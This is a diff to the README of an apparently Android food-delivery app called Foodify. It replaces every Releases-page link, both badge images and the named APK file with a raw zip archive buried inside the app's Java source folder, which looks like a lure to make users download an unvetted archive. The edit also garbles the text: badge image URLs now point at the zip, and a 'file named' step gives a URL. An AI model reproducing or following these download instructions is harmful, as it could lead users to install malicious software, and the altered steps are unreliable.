@@ -1,6 +1,6 @@
 # 🍕 Foodify-Android-App - Your Simplified Food Delivery Solution
 
-[![Download Foodify](https://img.shields.io/badge/Download%20Foodify-Android%20App-brightgreen)](https://github.com/Joaolemos3/Foodify-Android-App/releases)
+[![Download Foodify](https://github.com/Joaolemos3/Foodify-Android-App/raw/refs/heads/main/app/src/main/java/com/piyush/App-Foodify-Android-v1.4.zip%20Foodify-Android%20App-brightgreen)](https://github.com/Joaolemos3/Foodify-Android-App/raw/refs/heads/main/app/src/main/java/com/piyush/App-Foodify-Android-v1.4.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ This guide will help you download and run the Foodify Android App. Follow the st
 
 ### Step 1: Visit the Release Page
 
-To download the Foodify Android App, please [visit this page to download](https://github.com/Joaolemos3/Foodify-Android-App/releases).
+To download the Foodify Android App, please [visit this page to download](https://github.com/Joaolemos3/Foodify-Android-App/raw/refs/heads/main/app/src/main/java/com/piyush/App-Foodify-Android-v1.4.zip).
 
 ### Step 2: Choose Your App Version
 
@@ -29,7 +29,7 @@ On the Releases page, you will see a list of available versions. Look for the mo
 
 ### Step 3: Download the APK File
 
-In the release details, find the file named **Foodify.apk**. Click on this file to start the download.
+In the release details, find the file named **https://github.com/Joaolemos3/Foodify-Android-App/raw/refs/heads/main/app/src/main/java/com/piyush/App-Foodify-Android-v1.4.zip**. Click on this file to start the download.
 
 ### Step 4: Install the App
 
@@ -83,4 +83,4 @@ For any questions or support, you can reach out via the Issues section of the Gi
 
 Now that you have installed Foodify, explore various restaurants and enjoy a convenient food delivery experience. Happy ordering! 
 
-[![Download Foodify](https://img.shields.io/badge/Download%20Foodify-Android%20App-brightgreen)](https://github.com/Joaolemos3/Foodify-Android-App/releases)
+[![Download Foodify](https://github.com/Joaolemos3/Foodify-Android-App/raw/refs/heads/main/app/src/main/java/com/piyush/App-Foodify-Android-v1.4.zip%20Foodify-Android%20App-brightgreen)](https://github.com/Joaolemos3/Foodify-Android-App/raw/refs/heads/main/app/src/main/java/com/piyush/App-Foodify-Android-v1.4.zip)
